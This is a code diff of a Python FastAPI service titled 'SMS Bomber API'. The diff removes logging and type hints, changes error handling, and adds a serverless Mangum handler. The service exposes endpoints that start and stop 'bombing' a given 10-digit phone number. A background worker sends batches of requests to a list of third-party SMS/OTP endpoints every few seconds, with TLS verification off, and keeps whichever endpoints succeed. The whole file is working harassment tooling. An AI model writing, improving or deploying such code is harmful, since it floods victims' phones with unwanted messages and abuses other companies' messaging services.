@@ -7,13 +7,8 @@ import time
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
-import uvicorn
-from typing import Dict, Any, List
-import logging
-
-# Configure logging
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+import random
+import os
 
 app = FastAPI(
     title="SMS Bomber API",
@@ -30,8 +25,8 @@ app.add_middleware(
 )
 
 # Global state management
-bomber_tasks: Dict[str, asyncio.Task] = {}
-bomber_states: Dict[str, Dict[str, Any]] = {}
+bomber_tasks = {}
+bomber_states = {}
 
 # Enhanced API endpoints with more targets
 APIS = [
@@ -280,7 +275,7 @@ APIS = [
     }
 ]
 
-async def send_request(session: aiohttp.ClientSession, api: Dict[str, Any], phone_number: str, ip_address: str) -> tuple:
+async def send_request(session, api, phone_number, ip_address):
     """Send a single request to an API endpoint"""
     try:
         # Replace phone number in payload and headers
@@ -324,20 +319,16 @@ async def send_request(session: aiohttp.ClientSession, api: Dict[str, Any], phon
                     ssl=False
                 )
         else:
-            logger.warning(f"Unsupported method: {api['method']}")
             return None, api
 
         status_code = response.status
         return status_code, api
 
-    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-        logger.debug(f"Request failed for {api['endpoint']}: {e}")
+    except (aiohttp.ClientError, asyncio.TimeoutError):
         return None, api
 
-async def bomber_worker(phone_number: str, ip_address: str, task_id: str):
+async def bomber_worker(phone_number, ip_address, task_id):
     """Main bomber worker coroutine"""
-    logger.info(f"Starting bomber for {phone_number} (Task ID: {task_id})")
-    
     session_timeout = aiohttp.ClientTimeout(total=10)
     async with aiohttp.ClientSession(timeout=session_timeout) as session:
         cycle_count = 0
@@ -350,7 +341,6 @@ async def bomber_worker(phone_number: str, ip_address: str, task_id: str):
                 for _ in range(6):
                     if successful_apis:
                         # Randomize API selection for better distribution
-                        import random
                         selected_api = random.choice(successful_apis)
                         tasks.append(send_request(session, selected_api, phone_number, ip_address))
                 
@@ -365,14 +355,11 @@ async def bomber_worker(phone_number: str, ip_address: str, task_id: str):
                         status_code, api = result
                         if status_code in [200, 201]:
                             new_apis.append(api)
-                        elif status_code is not None:
-                            logger.debug(f"Removing {api['endpoint']} due to status code {status_code}")
                     
                     # Update successful APIs list
                     if new_apis:
                         successful_apis = new_apis
-                    elif cycle_count > 10:  # Only stop if we've tried multiple cycles
-                        logger.warning(f"All APIs failed for {phone_number}, stopping")
+                    elif cycle_count > 10:
                         break
                 
                 cycle_count += 1
@@ -381,21 +368,18 @@ async def bomber_worker(phone_number: str, ip_address: str, task_id: str):
                 await asyncio.sleep(2)
                 
             except asyncio.CancelledError:
-                logger.info(f"Bomber cancelled for {phone_number}")
                 break
-            except Exception as e:
-                logger.error(f"Error in bomber worker for {phone_number}: {e}")
+            except Exception:
                 await asyncio.sleep(1)
-
-    logger.info(f"Bomber stopped for {phone_number}")
-    if task_id in bomber_states:
-        bomber_states[task_id]["running"] = False
 
 @app.get("/api/start")
 async def start_bomber(phone: str):
     """Start SMS bombing for a phone number"""
     if not phone.isdigit() or len(phone) != 10:
-        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
+        return JSONResponse(
+            status_code=400,
+            content={"error": "Invalid phone number! Must be 10 digits."}
+        )
     
     # Generate task ID
     import uuid
@@ -424,8 +408,6 @@ async def start_bomber(phone: str):
     # Start bomber task
     bomber_tasks[task_id] = asyncio.create_task(bomber_worker(phone, "192.168.1.1", task_id))
     
-    logger.info(f"Started bomber for {phone} with Task ID: {task_id}")
-    
     return JSONResponse(
         status_code=200,
         content={
@@ -442,7 +424,10 @@ async def start_bomber(phone: str):
 async def stop_bomber(phone: str):
     """Stop SMS bombing for a phone number"""
     if not phone.isdigit() or len(phone) != 10:
-        raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
+        return JSONResponse(
+            status_code=400,
+            content={"error": "Invalid phone number! Must be 10 digits."}
+        )
     
     if phone not in bomber_states:
         return JSONResponse(
@@ -478,8 +463,6 @@ async def stop_bomber(phone: str):
     bomber_states[phone]["running"] = False
     bomber_states[phone]["end_time"] = time.time()
     
-    logger.info(f"Stopped bomber for {phone}")
-    
     return JSONResponse(
         status_code=200,
         content={
@@ -496,7 +479,10 @@ async def get_status(phone: str = None):
     """Get status of all running bombers or specific phone number"""
     if phone:
         if not phone.isdigit() or len(phone) != 10:
-            raise HTTPException(status_code=400, detail="Invalid phone number! Must be 10 digits.")
+            return JSONResponse(
+                status_code=400,
+                content={"error": "Invalid phone number! Must be 10 digits."}
+            )
         
         if phone not in bomber_states:
             return JSONResponse(
@@ -582,12 +568,3 @@ def handler(request):
     from mangum import Mangum
     mangum_handler = Mangum(app)
     return mangum_handler(request)
-
-if __name__ == "__main__":
-    # Local development
-    uvicorn.run(
-        "app:app",
-        host="0.0.0.0",
-        port=8000,
-        reload=True
-    )
